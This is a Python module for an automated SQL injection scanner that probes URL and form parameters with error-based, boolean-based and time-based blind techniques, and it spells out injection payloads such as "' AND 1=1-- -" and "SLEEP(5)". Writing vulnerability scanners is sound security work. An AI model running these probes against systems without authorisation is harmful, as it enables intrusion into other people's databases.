"""SQL Injection scanner — error-based, boolean-based, time-based blind."""
from __future__ import annotations

import asyncio
import re
import time
from typing import TYPE_CHECKING

from core.utils import merge_query, random_token

if TYPE_CHECKING:
    from core.orchestrator import Context

ERROR_SIGNATURES = [
    r"you have an error in your sql syntax",
    r"warning:.*mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"pg_query\(\)",
    r"sqlite3\.OperationalError",
    r"ORA-\d{5}",
    r"sqlstate\[\w+\]",
    r"odbc.*driver",
    r"microsoft.*odbc.*sql",
    r"syntax error at or near",
]
ERROR_RE = re.compile("|".join(ERROR_SIGNATURES), re.I)


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    findings = []
    payloads = ctx.payloads.for_category("sqli", limit=24)
    sem = asyncio.Semaphore(int(ctx.config.get("concurrency", {}).get("scanner_workers", 8)))

    async def test_param(param: str) -> None:
        # Step 1 — error-based
        for p in payloads:
            async with sem:
                ev = await _request(ctx, url, method, param, p, form)
            if ev.error:
                continue
            if ERROR_RE.search(ev.response_body or ""):
                findings.append(_finding(url, param, p, "error", ev,
                                         "SQL error string returned in response body"))
                ctx.memory.record_payload_result(p, "sqli", True)
                return
            ctx.memory.record_payload_result(p, "sqli", False)

        # Step 2 — boolean-based: compare TRUE vs FALSE responses
        true_p = "' AND 1=1-- -"
        false_p = "' AND 1=2-- -"
        async with sem:
            ev_true = await _request(ctx, url, method, param, true_p, form)
            ev_false = await _request(ctx, url, method, param, false_p, form)
        if ev_true.status == ev_false.status and ev_true.response_body and ev_false.response_body:
            ratio = abs(len(ev_true.response_body) - len(ev_false.response_body))
            if ratio > 50:
                findings.append(_finding(url, param, f"{true_p} / {false_p}", "boolean", ev_true,
                    f"Response length differs by {ratio} bytes between true/false payloads"))
                ctx.memory.record_payload_result(true_p, "sqli", True)
                return

        # Step 3 — time-based blind
        time_payloads = [
            "1' AND SLEEP(5)-- -",
            "1' AND (SELECT 1 FROM PG_SLEEP(5))-- -",
            "1; WAITFOR DELAY '0:0:5'-- -",
        ]
        for p in time_payloads:
            t0 = time.perf_counter()
            async with sem:
                ev = await _request(ctx, url, method, param, p, form)
            elapsed = time.perf_counter() - t0
            if elapsed >= 4.5 and ev.status:
                findings.append(_finding(url, param, p, "time", ev,
                    f"Response delayed {elapsed:.2f}s — confirms time-based SQLi"))
                ctx.memory.record_payload_result(p, "sqli", True)
                return

    await asyncio.gather(*(test_param(p) for p in params))
    return findings


async def _request(ctx, url, method, param, value, form):
    if method.upper() == "GET":
        return await ctx.http.get(merge_query(url, {param: value}))
    data = {i["name"]: i.get("value") or random_token(4) for i in (form or {}).get("inputs", [])}
    data[param] = value
    return await ctx.http.post(url, data=data)


def _finding(url, param, payload, kind, ev, evidence):
    sev_map = {"error": ("high", 8.1), "boolean": ("high", 7.5), "time": ("high", 7.5)}
    sev, cvss = sev_map.get(kind, ("medium", 6.0))
    return {
        "category": "sqli",
        "title": f"SQL injection ({kind}-based) in `{param}`",
        "severity": sev, "cvss": cvss,
        "url": url, "parameter": param, "payload": payload, "evidence": evidence,
        "request": f"{ev.method} {ev.url}",
        "response": (ev.response_body or "")[:1500],
        "metadata": {"detection": kind},
    }
